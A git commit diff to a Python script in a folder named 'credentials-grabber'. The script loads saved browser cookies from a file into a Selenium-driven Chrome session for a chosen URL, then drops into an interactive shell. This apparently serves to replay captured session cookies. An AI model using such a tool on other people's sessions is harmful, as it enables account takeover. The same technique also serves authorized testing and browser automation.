70045500963429aeb2c5dfc568ff06692caaa2ba
Charayaphan Nakorn Boon Han <charayaphan.nakorn.boon.han@gmail.com>
2022-07-11 19:43:48 +0800

    update

--- scripts/credentials-grabber/load-cookies.py
+++ scripts/credentials-grabber/load-cookies.py
@@ -4,6 +4,7 @@ from selenium import webdriver
 import os
 import ast
 import json
+import code
 
 url = input('Enter URL to visit: ')
 cookies_path = input('Enter path to cookies as string [default /tmp/cookies.txt]: ') or '/tmp/cookies.txt'
@@ -17,8 +18,14 @@ chrome_options.add_experimental_option("detach", True)
 driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=chrome_options)
 
 driver.get(url)
-cookies_file = json.load(open(cookies_path, "r"))
-cookies = ast.literal_eval(cookies_file)
-for cookie in cookies:
-    driver.add_cookie(cookie)
+try:
+    cookies_file = json.load(open(cookies_path, "r"))
+    cookies = ast.literal_eval(cookies_file)
+    for cookie in cookies:
+        driver.add_cookie(cookie)
+except json.decoder.JSONDecodeError:
+    pass
+except FileNotFoundError:
+    pass
 
+code.interact(local=locals())
